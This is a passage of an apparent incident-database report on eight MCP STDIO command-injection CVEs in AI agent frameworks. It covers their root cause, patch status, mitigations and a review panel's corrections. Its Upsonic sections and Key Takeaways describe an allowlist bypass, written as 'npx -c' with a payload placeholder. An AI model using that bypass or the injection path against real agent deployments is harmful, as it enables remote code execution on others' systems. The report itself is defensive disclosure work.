+Each framework used the official Anthropic MCP SDK as documented. The SDK accepts a `command` parameter and executes it. The SDK documentation does not identify this as a security-critical parameter requiring validation. From each framework developer's perspective, they were using a maintained SDK from a major AI vendor — the implicit trust model of the SDK supply chain applies. No framework developer made an implementation mistake; each made a reasonable trust inference about the safety of the SDK they adopted.
+
+**Why 2:** Why did the Anthropic MCP SDK execute STDIO commands without validation or restriction?
+
+This was an intentional protocol design decision. Anthropic's stated position — confirmed after OX Security's disclosure — is that sanitization is the responsibility of the integrating developer, not the SDK. The STDIO transport was designed for flexibility: any executable can be an MCP server, and restricting the command parameter would limit what servers developers can build. This positions the STDIO transport as a low-level OS subprocess wrapper, not a security boundary.
+
+**Why 3:** Why does treating the STDIO transport as a low-level subprocess wrapper create systemic supply chain risk?
+
+Because the SDK is not used by systems programmers who understand OS subprocess semantics — it is used by AI application developers building agent frameworks for a rapidly expanding ecosystem. When those developers expose the `command` parameter to user-facing interfaces (registration UIs, configuration files, marketplace integrations), the "developer's responsibility" for sanitization is distributed across hundreds of independent teams with varying security maturity. The 9/11 MCP marketplace acceptance rate demonstrates that the ecosystem's review infrastructure is not mature enough to catch malicious distribution before it reaches developers. The eight CVEs in this incident — across frameworks from multiple countries and market segments — demonstrate that the "sanitize yourself" instruction predictably produces unsanitized code at scale.
+
+**Why 4:** Why did the vulnerability persist across eight frameworks through November 2025 to April 2026 without being discovered and disclosed independently?
+
+The STDIO execution path is not visible in ordinary testing. A developer who registers an MCP server with a legitimate command sees a successful initialization. A developer who registers a malicious command sees an initialization error — the same failure mode as a misconfigured legitimate server. There is no signal in the normal development workflow that execution occurred before validation failed. Only a security researcher who specifically audited the SDK's execution order — not a developer building a feature — would observe the timing vulnerability. The November 2025 to April 2026 window reflects five months of systematic security research by a dedicated team, not negligence by eight framework teams who had no reason to audit execution ordering in an SDK they trusted.
+
+**Why 5 / Root cause:** The MCP protocol specification does not require, validate, or restrict what commands the STDIO transport executes. This omission creates a systemic supply chain liability: every developer who adopts the SDK inherits the flaw, every user-facing configuration surface becomes a potential RCE vector, and every downstream mitigation (like Upsonic's allowlist) is fragile against argument injection. Anthropic's confirmation that this is "expected behavior" converts a gap in the protocol specification into a permanent architectural property that will not be fixed on the vendor's initiative.
+
+**Root cause summary:** A protocol-level design decision — unconditional command execution in the STDIO transport, distributed to downstream developers as an implicit responsibility without a protocol-level enforcement mechanism — predictably produced eight independently exploitable CVEs across eight frameworks that did everything right by the SDK's own documentation. The root cause is not in any of the eight frameworks. It is upstream.
+
+---
+
+## Impact Assessment
+
+**Severity:** Critical
+
+The eight CVEs in this cluster carry CVSS scores ranging from 8.6 (Agent Zero, Langchain-Chatchat) to 9.8 (Upsonic) and 9.8/10.0 (DocsGPT). The incident is assessed at `critical` for AgentFail's severity taxonomy. An earlier draft used `high` on the grounds that no confirmed in-the-wild exploitation occurred — the Strategic Council corrected this classification: the absence of wild exploitation is already captured by `actual_vs_potential: "near-miss"`. The `severity` field represents intrinsic threat level, which is critical: production-environment PoC demonstrated on 6 of 8 frameworks, CVSS 9.8 with multiple frameworks fully unpatched as of May 2026, and no authentication required for the primary exploitation family (Family 1: UI injection) in many self-hosted configurations.
+
+Factors that support the critical classification:
+- CVSS 9.8/10.0 scores on multiple CVEs; no CVE in the cluster below 8.6 (those formally scored)
+- OX Security demonstrated full RCE on 6 production platforms under controlled but real-environment conditions
+- Three frameworks remain fully unpatched three weeks after coordinated disclosure
+- One "partial fix" (Upsonic) is bypassed with a single command-line flag
+- One "partial fix" (GPT Researcher) cannot be operator-verified without pulling the latest git commit
+
+The near-miss classification reflects exploitation confirmation status, not intrinsic severity.
+
+**Patch status as of May 8, 2026:**
+
+| CVE | Framework | CVSS | Status |
+|-----|-----------|------|--------|
+| CVE-2026-30624 | Agent Zero 0.9.8 | 8.6 HIGH | **UNPATCHED** |
+| CVE-2026-30618 | Fay Digital Human | Critical (unscored) | **UNKNOWN** |
+| CVE-2026-33224 | Bisheng | Critical (unscored) | **PATCHED** |
+| CVE-2026-30616 | Jaaz | Critical (unscored) | **UNPATCHED** |
+| CVE-2026-30617 | Langchain-Chatchat 0.3.1 | 8.6 HIGH | **UNPATCHED** |
+| CVE-2026-30625 | Upsonic 0.71.6 | 9.8 CRITICAL | **PARTIAL** — allowlist bypass (npx/npm -c) open |
+| CVE-2026-26015 | DocsGPT 0.15.0 | 9.8/10.0 CRITICAL | **PATCHED** (v0.16.0) |
+| CVE-2025-65720 | GPT Researcher | Critical (unscored) | **PARTIAL** — main branch only, no versioned release |
+
+**Who is at risk:**
+- Any organization running Agent Zero, Fay, Jaaz, or Langchain-Chatchat with STDIO-configured MCP servers — no patch available
+- Any organization running Upsonic with `npx` or `npm` in the STDIO command allowlist — bypass open regardless of version
+- Any organization running GPT Researcher on a pinned version or container image predating the fix merge — unprotected despite vendor action
+- Any organization running any MCP STDIO integration that was installed from an unreviewed marketplace registry — supply chain risk independent of framework-specific patches
+
+**Scale of exposure:**
+The eight frameworks span:
+- Autonomous agents deployed in production multi-step task pipelines (Agent Zero, Upsonic)
+- Enterprise knowledge management and RAG platforms deployed in corporate environments (Bisheng, Langchain-Chatchat, DocsGPT)
+- AI-powered research pipelines with broad web access (GPT Researcher)
+- UI/product design tooling (Jaaz)
+- Interactive digital persona deployments (Fay)
+
+Combined with the 7,000+ publicly enumerable MCP servers and 200,000+ estimated total MCP deployments (OX Security estimate; independent methodology not published), the exposure surface is not limited to niche developer tooling — it covers production enterprise AI infrastructure across at least two countries' enterprise AI ecosystems.
+
+**Averted damage estimate:** $3.5M probability-weighted central estimate (7,000 servers × $10,000/machine × 5% exploitation probability). Pre-probability scenario cost: $70M. If the 200,000 total server estimate is used: $98M probability-weighted.
+
+---
+
+## How It Could Have Been Prevented
+
+**1. Protocol-level command restriction in Anthropic's MCP SDK (root fix)**
+
+If the MCP SDK had restricted the STDIO `command` parameter to a set of known-safe executables — or required verification of a valid MCP handshake before allowing post-initialization execution — all eight CVEs would not exist. Framework developers would have received a safe API by default. The Upsonic bypass demonstrates the corollary: without protocol-level enforcement, any application-layer restriction is a temporary measure subject to argument injection.
+
+The most robust protocol-level fix is a validate-before-execute model: parse the command, verify it against a signed manifest or restricted grammar, and only then spawn the subprocess. This reverses the current timing vulnerability.
+
+**2. Explicit documentation of STDIO as a security-critical parameter**
+
+Each of the eight frameworks adopted MCP STDIO using the SDK as documented. The SDK documentation does not identify the `command` parameter as requiring security-critical handling. Explicit documentation — "the `command` parameter must be restricted to known binary paths; user-supplied values must never be passed without an allowlist" — would have given each framework team the information needed to build appropriate restrictions before shipping. This is the minimum viable prevention given Anthropic's decision to defer sanitization to developers.
+
+**3. Allowlist design that excludes script interpreter binaries**
+
+For the frameworks that did implement allowlists (Upsonic) and for those implementing them now, the allowlist must exclude `npx`, `npm`, and any other binary that accepts inline code execution via flags. Legitimate MCP server deployments that currently rely on `npx @modelcontextprotocol/server-*` patterns should be migrated to direct binary paths (e.g., `node /path/to/server/index.js`) or to container-wrapped invocations where argument injection is contained by the container boundary. This requires coordination with the MCP server ecosystem to establish non-npx distribution paths.
+
+**4. Management interface authentication hardening**
+
+Family 1 exploitation (UI injection) requires access to the management interface. Requiring authentication for all MCP server registration and configuration operations — and enforcing this regardless of deployment context — would have raised the bar for exploitation across Agent Zero, DocsGPT, Langchain-Chatchat, Bisheng, and Jaaz. In many self-hosted deployments, the management UI is exposed without authentication for perceived internal-only access; this assumption regularly breaks when network segmentation is imperfect.
+
+**5. Versioned release discipline for security patches**
+
+GPT Researcher's main-branch-only fix represents a failure mode in the patch delivery chain: the vendor acts, the fix exists, and operators cannot verify they have it. Any security patch that addresses a CVE must be delivered in a versioned release with a clear version identifier and CHANGELOG entry. This is not optional hygiene — without it, the CVE disclosure creates a false sense of resolution while operators remain exposed and unable to confirm their protection status.
+
+---
+
+## How It Was / Could Be Fixed
+
+### Per-Framework Patch Status
+
+**Bisheng (CVE-2026-33224) — PATCHED**
+DataElem Inc. released a patched version of Bisheng that restricts or validates the MCP STDIO command parameter. The fix eliminates the injection path. Operators should upgrade to the patched version.
+
+**DocsGPT (CVE-2026-26015) — PATCHED (v0.16.0)**
+DocsGPT 0.16.0 addresses the STDIO injection path. The patch is versioned and available. Operators on 0.15.0 or earlier should upgrade immediately; CVSS 9.8/10.0 and no authentication requirement make this a high-priority upgrade.
+
+**GPT Researcher (CVE-2025-65720) — PARTIAL (main branch only)**
+A fix was merged to the main branch. No versioned release exists. Operators must pull the latest commit and verify their running version includes the fix. Pinned deployments or container images built before the fix merge remain vulnerable. Operator action: rebuild containers from main, verify commit hash post-dates fix merge.
+
+**Upsonic (CVE-2026-30625) — PARTIAL (v0.72.0, bypass open)**
+v0.72.0 introduced a command allowlist. The allowlist includes `npx` and `npm`, both of which bypass the restriction via `-c`/`--eval` flags. The practical fix for Upsonic operators: remove `npx` and `npm` from the allowlist, migrate any npx-based MCP server to a direct binary path invocation, and verify no other allowlisted binary accepts inline code execution flags. Upsonic must release a follow-on patch that either removes npx/npm from the allowlist or adds argument-level validation.
+
+**Agent Zero (CVE-2026-30624) — UNPATCHED**
+No patch available. Operators running Agent Zero with MCP STDIO should implement one of: (a) OS-level subprocess sandboxing (seccomp, AppArmor) on the agent host; (b) network-level restriction of the management UI to known administrator IPs; (c) disable STDIO transport and use only SSE/HTTP MCP transport where applicable. Report the vulnerability to the Agent Zero maintainers and track patch availability.
+
+**Fay Digital Human (CVE-2026-30618) — UNKNOWN**
+Patch status not confirmed as of research date. Contact the Fay maintainers (xszyou/Fay on GitHub) to determine patch availability. Treat as unpatched until confirmed otherwise.
+
+**Jaaz (CVE-2026-30616) — UNPATCHED**
+No patch available. Same interim mitigation guidance as Agent Zero.
+
+**Langchain-Chatchat (CVE-2026-30617) — UNPATCHED**
+No patch available. Langchain-Chatchat deployments used for local knowledge bases may have a false sense of security from perceived network isolation — any access path that allows management UI interaction is sufficient for exploitation. Interim mitigations apply.
+
+### LiteLLM's Four-Layer Fix as Best-Practice Template
+
+LiteLLM (CVE-2026-30623, documented in AAGF-2026-022) implemented the most complete downstream mitigation publicly documented. For frameworks building their own fix, LiteLLM's four layers provide the design template:
+
+1. **Command allowlist:** Restrict to `{npx, uvx, python, python3, node, docker, deno}` — but note the Upsonic bypass and evaluate whether to exclude npx/npm or add argument-level validation
+2. **Request-level validation:** Validate the command value at the API boundary before it reaches any processing layer
+3. **Runtime re-validation:** Re-validate when instantiating stdio clients at runtime (defends against database or configuration file tampering between registration and instantiation)
+4. **Access control:** Restrict MCP server management operations to administrative roles; do not allow unauthenticated or low-privilege users to register STDIO servers
+
+The Upsonic bypass demonstrates that layer 1 (allowlist) alone is insufficient if the allowed binaries are unrestricted interpreters. All four layers together provide meaningful defense-in-depth.
+
+---
+
+## Solutions Analysis
+
+### 1. Protocol-Level Validate-Before-Execute (Anthropic SDK Change)
+
+- **Type:** Architectural Redesign
+- **Plausibility:** 5/5 — Technically the correct fix. Reversing the execution order (validate, then execute) eliminates the timing vulnerability for all eight frameworks and all future MCP integrations simultaneously. No per-framework action required after the SDK fix is applied.
+- **Practicality:** 2/5 — Anthropic has explicitly declined to make architectural changes, characterizing unconditional execution as "expected behavior." Without Anthropic's cooperation, this cannot be implemented at the protocol level. Community-forked or alternative SDK implementations could apply the fix, but ecosystem adoption would be slow and fragmented.
+- **How it applies:** The SDK reads the `command` parameter, verifies it against a signed manifest or restricted allowlist before spawning, or spawns in a sandbox and verifies a valid MCP handshake before granting the subprocess additional access. The malicious command either never executes or executes in a contained environment with no OS-level impact.
+- **Limitations:** Anthropic must change its position. Until then, this solution exists only as a recommendation. Breaking change to any existing STDIO configuration that relies on arbitrary command execution (a legitimate use case for advanced MCP server development).
+
+### 2. Strict Allowlist Excluding Script Interpreters (Per-Framework)
+
+- **Type:** Permission Scoping / Input Validation
+- **Plausibility:** 4/5 — The correct downstream fix when protocol-level enforcement is unavailable. Effectively eliminates direct injection. The Upsonic case demonstrates that the allowlist must exclude or carefully handle script interpreter binaries (npx, npm, python, node) that accept inline code via flags.
+- **Practicality:** 4/5 — Implementable immediately by each framework team without waiting for Anthropic. LiteLLM's four-layer fix provides a reference implementation. Cost: some legitimate MCP server configurations that rely on `npx`-based server launch patterns will need to be migrated to direct binary paths.
+- **How it applies:** Framework restricts the `command` parameter to an allowlist of explicit binary paths (not binary names) and validates that no disallowed flags are present in the argument list. Combine with request-level validation, runtime re-validation, and access control to the management interface.
+- **Limitations:** Requires every framework to independently implement and maintain. As Upsonic demonstrated, an incomplete allowlist is worse than a full-coverage fix — it creates a false sense of security. Any new binary added to the allowlist must be audited for inline execution capabilities. Argument-level flag validation is complex and language/binary-specific.
+
+### 3. Management Interface Authentication Enforcement
+
+- **Type:** Access Control
+- **Plausibility:** 5/5 — Directly addresses Family 1 (UI injection), which is the primary exploitation family for most of the eight frameworks. Requiring authentication for MCP server registration prevents unauthenticated exploitation regardless of the STDIO flaw.
+- **Practicality:** 5/5 — Standard web application security control; does not require protocol changes or SDK modifications. Each framework team can implement independently. Highest practicality-per-impact ratio of any solution in this cluster.
+- **How it applies:** All MCP server registration, configuration, and management endpoints require a valid administrator authentication token. Unauthenticated requests to these endpoints are rejected before reaching the STDIO transport. Deploy this as a compensating control immediately while waiting for SDK-level or allowlist fixes.
+- **Limitations:** Does not address prompt injection vectors (Family 3) or marketplace distribution (Family 4). Does not help for authenticated users with malicious intent (insider threat or compromised credentials). Not a substitute for fixing the STDIO transport itself — an authenticated attacker with management access can still inject.
+
+### 4. Container-Level Subprocess Sandboxing
+
+- **Type:** Architectural Defense
+- **Plausibility:** 4/5 — Sandbox the agent host process so that STDIO-spawned subprocesses cannot access the host OS, external network, or sensitive file paths. Even if the malicious command executes, it cannot escape the container to cause host-level damage.
+- **Practicality:** 3/5 — Requires infrastructure-level deployment changes. Effective for containerized deployments (Kubernetes, Docker with seccomp profiles, gVisor). Does not protect bare-metal or VM deployments without explicit sandboxing configuration. Most self-hosted framework deployments do not apply strict seccomp profiles by default.
+- **How it applies:** Apply a restrictive seccomp profile to the agent container that denies socket creation, fork/exec beyond the container boundary, and write access outside designated volumes. Use a read-only root filesystem where possible. GPT Researcher and other research agents need careful scoping — they legitimately need web access, but that access should be routed through a controlled proxy, not an unrestricted outbound socket.
+- **Limitations:** Sandbox escapes are a known attack class. Legitimate agent functionality (web browsing, code execution, file system access) often conflicts with aggressive sandboxing — getting the policy right without breaking agent capabilities is non-trivial. Does not fix the underlying vulnerability; limits blast radius only.
+
+### 5. Versioned Release Requirements for Security Patches (Ecosystem Governance)
+
+- **Type:** Process / Ecosystem Governance
+- **Plausibility:** 5/5 — The GPT Researcher case is a clear, documented example of a security patch that cannot be operationally verified by operators. The requirement — any CVE patch must be delivered in a versioned release — is unambiguous and directly addresses the failure mode.
+- **Practicality:** 4/5 — Requires each framework's maintainers to commit to release discipline. Open-source projects with small maintainer teams may resist the overhead of cutting releases. Ecosystem-level pressure (CVE databases refusing to mark CVEs as resolved without versioned releases, security advisories noting the issue) can drive adoption.
+- **How it applies:** When a CVE is patched, the fix is delivered in a tagged release with a version number higher than the last vulnerable version, a CHANGELOG entry identifying the CVE, and a security advisory cross-referencing the release. Operators can then verify protection by checking their version against the fix version. For OCI-packaged deployments, a new image tag must be published.
+- **Limitations:** Does not retroactively fix GPT Researcher or other frameworks with in-flight fixes. Requires ecosystem-wide adoption to be fully effective — some projects will continue using main-branch-only fixes regardless of guidelines. Does not address the STDIO vulnerability itself; it only ensures operators can verify their protection status.
+
+---
+
+## Related Incidents
+
+| Incident | Connection |
+|----------|------------|
+| [[AAGF-2026-022]] | Parent incident: MCP STDIO "execute-first, validate-never" protocol design flaw. Documents the architectural decision, Anthropic's "expected behavior" response, four exploitation families, 9/11 marketplace acceptance rate, and protocol-level scope. All eight CVEs in AAGF-2026-078 are downstream manifestations of the flaw documented in AAGF-2026-022. Do not re-read this incident as a separate problem — it is the same flaw, in eight more frameworks. |
+| [[AAGF-2026-057]] | CVE-2026-30615 (Windsurf) — from the same OX Security research batch and coordinated disclosure event. Excluded from this incident because it is an IDE-level zero-click prompt injection vector (Family 3), not an agent framework management UI injection (Family 1/2). Windsurf is documented separately because of its distinct deployment context and exploitation pathway. |
+| [[AAGF-2026-068]] | CVE-2026-40933 (Flowise MCP adapter) — from the same OX Security research program. Excluded from this incident because Flowise is documented in its own prior incident (AAGF-2026-068) covering its three-CVE cluster including the CISA KEV-listed CVE. Flowise is the most consequential downstream case: it is the only one with confirmed in-the-wild exploitation. |
+| [[AAGF-2026-013]] | CVE-2025-59528 (Flowise CustomMCP) — earlier Flowise MCP RCE predating the April 2026 cluster. Documents the same STDIO injection class in Flowise's earlier CustomMCP node. AAGF-2026-078's eight CVEs are the April 2026 expansion of the same pattern that was first documented in Flowise via this earlier incident. |
+
+---
+
+## Strategic Council Review
+
+*Conducted: 2026-05-08. Council operates without access to prior research reasoning — evaluates the draft on its own terms.*
+
+---
+
+### Challenger Findings
+
+**Challenge 1: Source Bias Is Under-Disclosed in the Body Text**
+
+OX Security is simultaneously the sole primary researcher, the vendor seeking reputation from this disclosure, and the source of the most consequential unverifiable figure in the report (200,000 total MCP servers, methodology unpublished). The advisory's self-promotional title ("The Mother of All AI Supply Chains") was coined by OX Security and is repeated uncritically throughout. The draft cites OX Security blog posts at "High" credibility on par with NVD CVE records, without noting that the primary source has a disclosure incentive. The claim of "full RCE on 6 production platforms in controlled pre-disclosure testing" is not independently verified — "controlled pre-disclosure testing" describes researcher-managed conditions, not a third-party validation. The CSA independent analysis (one source of seventeen) is the only external technical validation and is not foregrounded as such. The 200,000-server figure appears in the impact section body text without attribution as an OX Security-only estimate. This was corrected in the body text (council added: "OX Security estimate; independent methodology not published"). The researcher_notes adequately disclose this; the body section now reflects it.
+
+**Challenge 2: vendor_response: "fixed" Materially Misrepresents the Patch Landscape**
+
+As of the curation date, only 2 of 8 CVEs are cleanly patched. Four are unpatched or of unknown status. Two have partial fixes with documented problems (Upsonic bypass open; GPT Researcher fix unversioned). Setting `vendor_response: "fixed"` — even with a comment — creates a material misclassification risk for any operator or downstream system that reads the YAML field. An automated vulnerability tracker consuming AgentFail frontmatter would mark this cluster as resolved. The field was corrected to `"acknowledged"`: vendors were notified, some acted, but the majority of the eight CVEs are not fixed in any operationally verifiable sense.
+
+**Challenge 3: Damage Estimate Has a Server-Machine Equivalence Assumption That Is Not Surfaced**
+
+The averted damage calculation (7,000 servers × $10,000/machine) implicitly treats each MCP server as a distinct machine. MCP servers are software processes; multiple instances can run on a single host. If even 30% of the 7,000 enumerable servers are co-hosted, the unique machine count drops below 5,000 and the base calculation overstates the denominator proportionally. The SANS IR cost benchmark (per compromised machine) applied to server instances rather than machines inflates the pre-probability scenario cost. This does not invalidate the estimate — which carries `confidence: "estimated"` — but the assumption should be named. It was not corrected in the body (the estimate methodology notes are already detailed and the inflection is bounded by the confidence label); flagged here for awareness.
+
+**Challenge 4: Timeline Aggregation Obscures Per-Framework Exposure Windows**
+
+The timeline entry "~2025 (various)" covers all eight framework MCP integrations. The exposure window per framework is determined by the gap between integration date and patch date (or ongoing for unpatched CVEs). These windows vary materially and affect the cumulative risk surface per framework — a framework integrated in Q1 2025 has had 12+ months of exposure window; one integrated in Q4 2025 has had 6. The draft acknowledges that integration dates are not individually determinable via public documentation, and the total_damage_window field is appropriately hedged. This limitation is real but adequately disclosed; no correction required.
+
+**Challenge 5: severity: "high" Conflates Exploitation Confirmation With Intrinsic Threat Level**
+
+The draft's original severity assessment used no confirmed in-the-wild exploitation as a severity downgrade factor. This conflates two separate dimensions: exploitation confirmation (handled by `actual_vs_potential`) and intrinsic threat severity (the `severity` field). An unpatched CVSS 9.8 CVE with a production-demonstrated PoC is a critical severity incident by every standard security taxonomy, regardless of whether opportunistic attackers have been observed exploiting it. The severity field was corrected to `"critical"` by the council. The justification for the downgrade — controlled research access — is the definition of a near-miss, not a severity mitigator.
+
+**Challenge 6: "Infrastructure Damage" Category Applied to a Near-Miss With No Confirmed Consequences**
+
+"Infrastructure Damage" implies infrastructure was damaged. None was. The controlled PoC demonstrations in pre-disclosure testing are research artifacts. The category was removed and replaced with "Unauthorized Code Execution," which accurately describes the realized (in research conditions) and potential (in wild exploitation) impact of the vulnerability class.
+
+---
+
+### Steelman Defense
+
+**Defense 1: The Near-Miss / Severity Separation Is the Right Signal Architecture for This Database**
+
+The draft's multi-dimensional classification — `actual_vs_potential: "near-miss"` combined with high technical severity — is the correct approach to preserving signal fidelity in the AgentFail database. Collapsing all severity signals into a single "critical" or "high" field would lose the distinction between this incident (no wild exploitation, researcher-controlled) and Flowise (AAGF-2026-068, CISA KEV-listed, confirmed in-the-wild). The near-miss label is not severity deflation — it is precision. The council's correction of the `severity` field to `"critical"` does not change this signal architecture; it corrects the intrinsic severity calibration while preserving the near-miss qualifier. The report correctly handles a genuinely complex incident where multiple dimensions of severity are in tension.
+
+**Defense 2: The Root Cause Analysis Arrives at a Genuine Structural Cause, Not a Symptom**
+
+The 5 Whys chain is not circular. It correctly identifies the proximate cause (eight frameworks passing unsanitized user input to the STDIO command parameter), traces through three intermediate layers (SDK design, design philosophy, developer profile mismatch), and arrives at a root cause (the protocol specification does not require, validate, or restrict STDIO command execution — converting a design gap into a permanent architectural property after Anthropic's "expected behavior" confirmation). The evidence for each layer is the observed behavior of eight independent development teams, each doing exactly what the SDK documentation specified. Eight identical mistakes from eight independent teams is not a coincidence explanation — it is structural cause evidence. The root cause identification is the strongest analytical contribution in the report.
+
+**Defense 3: The Upsonic Bypass Analysis Delivers Unique Operational Intelligence**
+
+The draft's treatment of the Upsonic bypass (CVE-2026-30625) — how the allowlist was designed, why npx and npm defeat it, what the correct fix requires, and why the correct fix breaks legitimate deployments — is not available in the CVE record, the NVD entry, or the OX Security advisory at the same level of detail. The draft explains the specific bypass payloads, the reason allowlisted interpreters are not equivalent to allowlisted commands, and the trade-off any framework faces when implementing the correct fix (exclude npx/npm, break many legitimate MCP servers; or add argument-level validation, introduce implementation complexity). This is operational intelligence that changes an operator's vulnerability response from "apply patch" to "apply patch AND verify allowlist composition AND validate no bypass path exists in your allowed binaries." The analysis justifies this report's existence beyond the raw CVE database.
+
+**Defense 4: The Operator TL;DR and Per-Framework Guidance Are Specifically Actionable**
+
+The `operator_tldr` field and the "How It Was / Could Be Fixed" section provide framework-specific, version-specific, action-specific guidance calibrated to the actual patch status. The guidance for Agent Zero/Fay/Jaaz (treat as unpatched indefinitely; implement OS/network-layer STDIO restrictions) is different from the guidance for Upsonic (upgrade, but also remove npx/npm from the allowlist) and GPT Researcher (verify commit hash post-dates fix merge; do not rely on version number). This differentiation across three distinct operator verification challenges (no patch, partial patch with bypass, patch without versioned release) is not found in any single source — it synthesizes patch status, technical bypass analysis, and operational verification requirements into a format usable by a security team doing CVE triage. The TL;DR quality is high.
+
+**Defense 5: The Scope Exclusions Are Principled and Well-Documented**
+
+The draft explicitly justifies the exclusion of four CVEs from the same OX Security research batch (Windsurf, Flowise MCP adapter, Flowise CustomMCP, LiteLLM) with specific reasons: different deployment context (IDE vs. agent framework), prior documentation in existing AgentFail incidents, or role as the parent incident. The researcher_notes document each exclusion. The related_incidents section provides cross-references. This is correct database hygiene — the incident covers exactly the scope it should, no more and no less — and the boundary decisions are documented transparently enough for a future editor to audit them.
+
+---
+
+### Synthesis
+
+**Corrections Required (Applied):**
+
+1. `severity: "high"` → `severity: "critical"` — Intrinsic threat level is critical (CVSS 9.8, production PoC, multiple unpatched frameworks). The absence of wild exploitation belongs in `actual_vs_potential`, not `severity`. Corrected.
+
+2. `vendor_response: "fixed"` → `vendor_response: "acknowledged"` — Only 2 of 8 CVEs cleanly patched at curation date. The "fixed" label would mislead operators and any downstream system consuming the YAML. Corrected.
+
+3. `category: "Infrastructure Damage"` → `category: "Unauthorized Code Execution"` — No infrastructure was damaged (near-miss). The category reflects actual (in research) and potential (in wild) impact, not a realized operational consequence. Corrected.
+
+4. **200,000-server figure in body text** — Added caveat attributing the estimate to OX Security with note that methodology is not independently published. Corrected.
+
+**Challenger Points Addressed by Steelman (No Correction Required):**
+
+- Challenge 3 (server-machine equivalence in damage estimate): The `confidence: "estimated"` label, combined with detailed methodology notes, is adequate disclosure for a probability-weighted estimate at this level of precision. The estimate is an order-of-magnitude signal, not a financial accounting figure.
+- Challenge 4 (timeline imprecision): The integration date limitation is explicitly acknowledged in the total_damage_window field and researcher_notes. Adequate disclosure given that per-framework commit history was not within scope of this research pass.
+
+**Final Verdict:**
+
+The report is analytically strong where it matters most: the root cause chain is structurally sound, the Upsonic bypass analysis is uniquely valuable, the near-miss classification is precise, and the operator guidance differentiates correctly across three distinct patch status scenarios. The four corrections address real errors (severity inflation downward, vendor_response mislabeled, category overstated, source bias underacknowledged in body) that would affect operator decision-making or downstream data consumers. After corrections, the report is publication-ready.
+
+**Confidence: High.** Core technical claims corroborated by NVD CVE records and independent press. The analytical disagreements are limited to classification fields where the correct values can be assessed against the available evidence.
+
+**Unresolved Uncertainties:**
+- Fay Digital Human (CVE-2026-30618) patch status: unknown at curation date. Resolves by checking the xszyou/Fay GitHub repository.
+- Langchain-Chatchat patch status: reported unpatched at disclosure; may have been addressed between April 15 and May 8, 2026. Resolves by checking the repository.
+- OX Security's 200,000-server methodology: unresolvable without OX Security publishing their enumeration approach or a third party independently replicating it.
+- Whether Jaaz is still actively maintained: the research notes Jaaz was discovered during the sweep rather than appearing in the original brief — if the project is dormant, the unpatched status may be permanent rather than pending.
+
+---
+
+## Key Takeaways
+
+1. **Eight separate CVEs from one protocol design decision confirms that supply chain vulnerabilities multiply proportionally with ecosystem adoption.** Every framework that integrated MCP STDIO correctly, by the SDK's own documentation, inherited a full RCE capability. The vulnerability was not introduced by any framework developer mistake — it was delivered by the SDK. This is the defining characteristic of a protocol-level supply chain flaw: the developer count affected scales with adoption, and fixing downstream CVEs one by one is remediation theater until the protocol is addressed.
+
+2. **Allowlists that include script interpreters are not allowlists.** The Upsonic bypass is the single most operationally important technical finding in this cluster. `npx -c '<payload>'` bypasses a command allowlist in one flag. Any framework deploying a command allowlist that includes `npx`, `npm`, `python`, `node`, or any other binary that accepts inline code execution via flags has not mitigated the CVE — it has introduced the appearance of mitigation while leaving the attack path open. Operators should verify their framework's allowlist specifically excludes or validates against these binaries.
+
+3. **Patch status is not binary — operators must verify, not assume.** The eight CVEs in this cluster present three distinct operator verification challenges: (a) no patch (Agent Zero, Fay, Jaaz — operator must implement compensating controls); (b) partial patch with documented bypass (Upsonic — operator must understand the bypass and apply additional restrictions); (c) patch without versioned release (GPT Researcher — operator cannot verify protection via version check). Security teams that process CVE advisories and mark "patched" based on vendor acknowledgment will have false positives in their vulnerability tracking for at least two of the eight frameworks.
+
+4. **The attack surface is not bounded by geography or obvious AI use cases.** Bisheng and Langchain-Chatchat demonstrate that Chinese enterprise AI infrastructure inherits the same MCP STDIO flaw as Western equivalents. Fay Digital Human demonstrates that a digital human chatbot framework — not a context typically associated with security-critical infrastructure — can carry full RCE exposure via its MCP integration. Threat models that scope the MCP attack surface to developer tools and Western AI frameworks are incomplete.
+
+5. **Coordinated disclosure creates a remediation window that operators must act on immediately.** OX Security's coordinated pre-disclosure process gave each vendor notification before the April 15, 2026 public release. The frameworks that patched (Bisheng, DocsGPT) used this window correctly. The frameworks that remain unpatched wasted it. For security teams: when a major coordinated disclosure event like "The Mother of All AI Supply Chains" is announced, treat all frameworks in the batch as potentially unpatched until individually verified — not just the frameworks named in initial press coverage. The coordinated disclosure window is the operator's best protection interval; it ends the moment the CVE details go public.
+
+---
+
+## References
+
+| Source | URL | Date | Credibility |
+|--------|-----|------|-------------|
+| OX Security — Primary Advisory ("The Mother of All AI Supply Chains") | https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/ | 2026-04-15 | High — original researcher disclosure; primary source for all eight CVEs, four exploitation families, marketplace acceptance rate, and research timeline |
+| OX Security — MCP Supply Chain Advisory (CVE detail) | https://www.ox.security/blog/mcp-supply-chain-advisory-rce-vulnerabilities-across-the-ai-ecosystem/ | 2026-04-15 | High — full CVE-level advisory; per-framework exploitation details and patch status at time of disclosure |
+| NVD — CVE-2026-30624 (Agent Zero) | https://nvd.nist.gov/vuln/detail/CVE-2026-30624 | 2026-04-15 | High — authoritative CVE record; CVSS 8.6 HIGH |
+| NVD — CVE-2026-30618 (Fay Digital Human) | https://nvd.nist.gov/vuln/detail/CVE-2026-30618 | 2026-04-15 | High — authoritative CVE record |
+| NVD — CVE-2026-33224 (Bisheng) | https://nvd.nist.gov/vuln/detail/CVE-2026-33224 | 2026-04-15 | High — authoritative CVE record; patched |
+| NVD — CVE-2026-30616 (Jaaz) | https://nvd.nist.gov/vuln/detail/CVE-2026-30616 | 2026-04-15 | High — authoritative CVE record |
+| NVD — CVE-2026-30617 (Langchain-Chatchat) | https://nvd.nist.gov/vuln/detail/CVE-2026-30617 | 2026-04-15 | High — authoritative CVE record; CVSS 8.6 HIGH; unpatched |
+| NVD — CVE-2026-30625 (Upsonic) | https://nvd.nist.gov/vuln/detail/CVE-2026-30625 | 2026-04-15 | High — authoritative CVE record; CVSS 9.8 CRITICAL; partial patch with documented bypass |
+| NVD — CVE-2026-26015 (DocsGPT) | https://nvd.nist.gov/vuln/detail/CVE-2026-26015 | 2026-04-15 | High — authoritative CVE record; CVSS 9.8/10.0 CRITICAL; patched v0.16.0 |
+| NVD — CVE-2025-65720 (GPT Researcher) | https://nvd.nist.gov/vuln/detail/CVE-2025-65720 | 2026-04-15 | High — authoritative CVE record; 2025 sequence number is reservation artifact, not 2025 disclosure |
